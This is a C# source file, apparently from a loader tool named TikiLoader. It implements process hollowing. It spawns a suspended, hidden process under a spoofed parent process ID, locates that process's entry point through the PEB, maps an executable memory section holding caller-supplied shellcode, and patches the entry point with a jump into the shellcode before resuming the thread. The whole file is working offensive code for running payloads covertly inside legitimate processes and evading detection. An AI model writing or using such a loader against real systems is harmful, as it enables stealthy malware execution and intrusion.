using System;
using System.Runtime.InteropServices;


using static TikiLoader.Structs;
using static TikiLoader.Enums;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace TikiLoader
{
    public class DynamicHollower
    {
       
        private const int AttributeSize = 24;
        private const ulong PatchSize = 0x10;

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;


      

        public static uint round_to_page(uint size)
        {
            try
            {
                SYSTEM_INFO info = new SYSTEM_INFO();
                Natives.GetSystemInfo(ref info);
                return (info.dwPageSize - size % info.dwPageSize) + size;
            }
            catch(Exception e)
            {
                Console.WriteLine($"inside round to page got exception: {e} ");
                return (uint)0;
            }
        }
        
        private bool nt_success(long v)
        {
            return (v >= 0);
        }
       
        private IntPtr GetCurrent()
        {
            return Natives.GetCurrentProcess();
        }

        private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemoryProtection protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var status = Natives.ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        private bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = Natives.ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        private void SetLocalSection(uint size)
        {
            var vals = MapSection(GetCurrent(), MemoryProtection.ReadWrite, IntPtr.Zero);

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        private void CopyShellcode(byte[] buf)
        {
            var lsize = size_;

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        private IntPtr FindEntry(IntPtr hProc)
        {
            Console.WriteLine($"hProc: {hProc}");
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = Natives.ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            Console.WriteLine($"Success: {success}");
            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            Natives.ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);
            Console.WriteLine("Readprocessmemory for first time");
            Console.WriteLine($"addrbuf: {addrBuf.Length}");
            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            Console.WriteLine($"Readloc: {readLoc}");
            pModBase_ = readLoc;
            Console.WriteLine("Read process memory for second time");
            Natives.ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
            Console.WriteLine($"left read process memory");
            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {
            var tmp = MapSection(pInfo.hProcess, MemoryProtection.ExecuteRead, IntPtr.Zero);

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = BuildEntryPatch(tmp.Key);

            try
            {
                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();
               
                //TikiLoader.NativeSysCall.ZwWriteVirtualMemory10(pInfo.hProcess, ref pEntry_, patch.Value, (uint)patch.Key, ref remotesize_);
                Natives.WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();

            Natives.ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
            var res = Natives.ResumeThread(pInfo.hThread);
        }

        private IntPtr GetBuffer()
        {
            return localmap_;
        }

        ~DynamicHollower()
        {
            if (localmap_ != (IntPtr)0)
                Natives.ZwUnmapViewOfSection(section_, localmap_);
        }



        public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;
                    

                IntPtr lpSize = IntPtr.Zero;

                Natives.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Natives.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                int ProcThreadAttributeParentProcess = 0x00020000;
                Natives.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                bool result = Natives.CreateProcessW(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, 134742028, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                Console.WriteLine($"Result of CreateProcessW: {result}");
                Console.WriteLine($"pInfo: {pInfo}");
                return pInfo;

            }
            finally
            {
                Natives.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
                Console.WriteLine("left finally");
            }

        }

        public static string GetAllFootprints(Exception x)
        {
            var st = new StackTrace(x, true);
            var frames = st.GetFrames();
            var traceString = new StringBuilder();

            foreach (var frame in frames)
            {
                if (frame.GetFileLineNumber() < 1)
                    continue;

                traceString.Append("File: " + frame.GetFileName());
                traceString.Append(", Method:" + frame.GetMethod().Name);
                traceString.Append(", LineNumber: " + frame.GetFileLineNumber());
                traceString.Append("  -->  ");
            }

            return traceString.ToString();

        }

        public void Hollow(string binary, byte[] shellcode, int ppid)
        {
            try
            {

                var pinf = StartProcess(binary, ppid);
                Console.WriteLine("Started process");
                FindEntry(pinf.hProcess);
                Console.WriteLine("found entry");
                CreateSection((uint)shellcode.Length);
                Console.WriteLine("Created section");
                SetLocalSection((uint)shellcode.Length);
                Console.WriteLine("After SetLocalSection");
                CopyShellcode(shellcode);
                Console.WriteLine("Copied shellcode");
                MapAndStart(pinf);
                Console.WriteLine("Mapped and started");
                Natives.CloseHandle(pinf.hThread);
                Console.WriteLine("Closed handle for pinf");
                Natives.CloseHandle(pinf.hProcess);
                Console.WriteLine("closed handle hProcess");
            }
            catch(Exception e)
            {
                Console.WriteLine($"an exception has occurred: {e}");
                Debug.WriteLine(GetAllFootprints(e));
            }
        }

    }
}
